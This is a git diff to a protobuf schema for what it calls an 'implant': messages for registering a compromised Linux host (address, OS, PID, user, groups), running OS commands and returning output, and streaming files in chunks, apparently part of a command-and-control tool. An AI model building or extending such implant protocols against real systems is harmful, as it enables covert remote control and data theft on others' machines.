@@ -2,17 +2,73 @@
 syntax = "proto3";
 package implantpb;
 
+// Python (the worst programming language in existence (opinion)) stores protobufs 
+// as byte objects and will happily deserialize literally anything into any protobuf of any type.
+// There's no way to guarantee the type of the protocol buffer without metadata,
+// so this "Box" containing type data is a workaround.
+message Message {
+  enum MessageType {
+    Error = 0;
+    Registration = 1;
+    RegistrationConfirmation = 2;
+    OsCmd = 3;
+    OsCmdOutput = 4;
+    FileXfer = 5;
+    FilePacket = 6;
+  }
+  MessageType message_type = 1;
+  bytes data = 2;
+}
+
+message Error {
+  enum ErrorType {
+    MessageDecode = 0;
+    Registration = 1;
+    OsCmd = 2;
+    FileXfer = 3;
+  }
+  ErrorType error_type = 1;
+  string message = 2;
+}
+
 // Basic info about an implant
 message Registration {
   string addr = 1;
   string os = 2;
   uint32 pid = 3;
+  // A user/group on a linux machine
+  message User {
+    uint32 id = 1;
+    string name = 2;
+  }
   User user = 4; // The user running the implant
   repeated User groups = 5; // The groups this user is a part of
 }
 
-// A user/group on a linux machine
-message User {
-  uint32 id = 1;
-  string name = 2;
+// TODO: Add actual authentication
+message RegistrationConfirmation {
+  string id = 1;
+}
+
+message OsCmd {
+  string cmd = 1;
+}
+
+message OsCmdOutput {
+  oneof status {
+    int32 code = 1;
+  }
+  bytes stdout = 2;
+  bytes stderr = 3;
+}
+
+// Transfer a file
+message FileXfer {
+  string filename = 1;
+  bytes checksum = 2;
+}
+
+// Stream a file in chunks
+message FilePacket {
+  bytes data = 1;      // File data.
 }
